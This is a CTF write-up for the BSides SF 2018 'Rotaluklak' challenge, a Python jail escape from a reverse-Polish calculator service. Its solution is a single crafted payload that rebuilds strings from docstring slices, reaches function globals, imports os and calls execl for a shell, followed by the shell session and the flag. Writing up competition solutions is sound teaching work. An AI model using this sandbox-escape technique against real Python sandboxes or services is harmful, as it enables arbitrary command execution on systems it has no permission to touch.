---
title: "BSides SF CTF 2018 - Rotaluklak (Pwn)"
header:
  overlay_image: /assets/images/bsidessf2018/rotaluklak/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Jordan McDonald on Unsplash"

tags:
  - bsidessf2018
  - writeup
  - pwn
---

Escape python jail.

## Challenge Description

```
Hack our calculator!

Location: rotaluklak-ee50cc.challenges.bsidessf.net:1234
```

#### Points

Points: 300

Solves: 5

## Solution

```
$ nc rotaluklak-ee50cc.challenges.bsidessf.net 1234

+-------------------------------------------------------------------------+
| This is a calculator that takes expressions in reverse polish notation. |
|                                                                         |
| In reverse polish notation the operands precede the operators. Unlike   |
| conventional infix notation every statement is unambiguous so no        |
| parenthesis are required.                                               |
|                                                                         |
| Here are some examples of how to use it:                                |
| 1 1 add             -> (1 + 1)                                          |
| 1 1 add 5 multiply  -> (1 + 1) * 5                                      |
|                                                                         |
| Here are the operators available to you.                                |
| add      - addition                                                     |
| subtract - subtraction                                                  |
| multiply - multiplication                                               |
| divide   - standard division                                            |
| idivide  - integer division                                             |
| power    - exponentiation                                               |
| xor      - standard exclusive-or function                               |
| wumbo    - standard wumbo function                                      |
|                                                                         |
| the quick brown fox jumps over the lazy dog                             |
| THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG                             |
| 1234567890~!@#$%^&*()_+-=[]{}\|:;"'?/>.<,     ¯\_(ツ)_/¯                |
+_________________________________________________________________________+

Enter your expression:
87 88 __doc__.__getslice__  1772 1773 __doc__.__getslice__ 1772 1773 __doc__.__getslice__ add 358 359 __doc__.__getslice__ add 93 94 __doc__.__getslice__ add 81 82 __doc__.__getslice__ add 91 92 __doc__.__getslice__ add 96 97 __doc__.__getslice__ add 81 82 __doc__.__getslice__ add 120 121 __doc__.__getslice__ add 82 83 __doc__.__getslice__ add 1772 1773 __doc__.__getslice__ add 1772 1773 __doc__.__getslice__ add 1 wumbo.im_func.func_globals.get __setattr__ 82 83 __doc__.__getslice__ 97 98 __doc__.__getslice__ 82 83 __doc__.__getslice__ add 1 a.__import__ __setattr__ 1787 1788 __doc__.__getslice__ 358 359 __doc__.__getslice__ add 81 82 __doc__.__getslice__ add 120 121 __doc__.__getslice__ add 1787 1788 __doc__.__getslice__ add 82 83 __doc__.__getslice__ add 80 81 __doc__.__getslice__ add 78 79 __doc__.__getslice__ s.execl
ls -la
total 12
drwxr-xr-x 2 nobody 65534 4096 Apr 14 05:55 .
drwxr-xr-x 3 ctf     1000   60 Apr 16 08:44 ..
-rw-r--r-- 2 nobody 65534   95 Apr 11 16:30 flag.c
-rw-r--r-- 2 nobody 65534 3075 Apr 11 16:30 main.py
cd /
ls -la
total 24
drwxrwxrwt 10 ctf     1000  240 Apr 16 08:44 .
drwxrwxrwt 10 ctf     1000  240 Apr 16 08:44 ..
drwxr-xr-x  2 nobody 65534 4096 Apr 14 05:55 bin
drwxr-xr-x  3 ctf     1000   80 Apr 16 08:44 dev
drwxr-xr-x  2 ctf     1000   60 Apr 16 08:44 etc
drwxr-xr-x  3 ctf     1000   60 Apr 16 08:44 home
---x--x--x  3 nobody 65534 8608 Apr 14 05:51 hooraay_run_me_to_get_your_flag
drwxr-xr-x  9 nobody 65534 4096 Apr 14 05:55 lib
-rw-r--r--  1 ctf     1000    0 Apr 16 08:44 lib32
drwxr-xr-x  2 nobody 65534 4096 Apr 14 05:55 lib64
drwxrwxrwt  2 ctf     1000   40 Apr 16 08:44 tmp
drwxr-xr-x  5 ctf     1000  140 Apr 16 08:44 usr
./hooraay_run_me_to_get_your_flag
FLAG: r3vers3_p0lish_eXpl01tS!
```

Flag: **FLAG:r3vers3\_p0lish\_eXpl01tS!**

